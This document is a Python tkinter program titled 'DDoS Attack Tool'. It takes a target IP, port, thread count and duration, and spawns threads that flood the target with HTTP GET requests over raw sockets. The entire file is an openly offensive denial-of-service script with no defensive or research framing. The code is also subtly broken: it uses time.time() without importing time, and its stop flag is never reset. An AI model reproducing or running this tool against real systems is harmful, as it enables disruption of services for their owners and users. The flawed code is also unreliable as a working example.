import tkinter as tk
from tkinter import messagebox
import socket
import threading

def start_attack():
    target_ip = target_entry.get()
    target_port = int(port_entry.get())
    num_threads = int(threads_entry.get())
    duration = int(duration_entry.get())

    if not all([target_ip, target_port, num_threads, duration]):
        messagebox.showerror("Error", "All fields are required!")
        return

    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port, duration))
        thread.start()

def stop_attack():
    global stop_attack_flag
    stop_attack_flag = True

def attack(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    start_time = time.time()

    while time.time() - start_time < duration:
        if stop_attack_flag:
            break
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")

    sock.close()

root = tk.Tk()
root.title("DDoS Attack Tool")

target_label = tk.Label(root, text="Target IP:")
target_label.grid(row=0, column=0, padx=5, pady=5)

target_entry = tk.Entry(root)
target_entry.grid(row=0, column=1, padx=5, pady=5)

port_label = tk.Label(root, text="Target Port:")
port_label.grid(row=1, column=0, padx=5, pady=5)

port_entry = tk.Entry(root)
port_entry.grid(row=1, column=1, padx=5, pady=5)

threads_label = tk.Label(root, text="Number of Threads:")
threads_label.grid(row=2, column=0, padx=5, pady=5)

threads_entry = tk.Entry(root)
threads_entry.grid(row=2, column=1, padx=5, pady=5)

duration_label = tk.Label(root, text="Duration (seconds):")
duration_label.grid(row=3, column=0, padx=5, pady=5)

duration_entry = tk.Entry(root)
duration_entry.grid(row=3, column=1, padx=5, pady=5)

start_button = tk.Button(root, text="Start Attack", command=start_attack)
start_button.grid(row=4, column=0, padx=5, pady=5)

stop_button = tk.Button(root, text="Stop Attack", command=stop_attack)
stop_button.grid(row=4, column=1, padx=5, pady=5)

stop_attack_flag = False

root.mainloop()
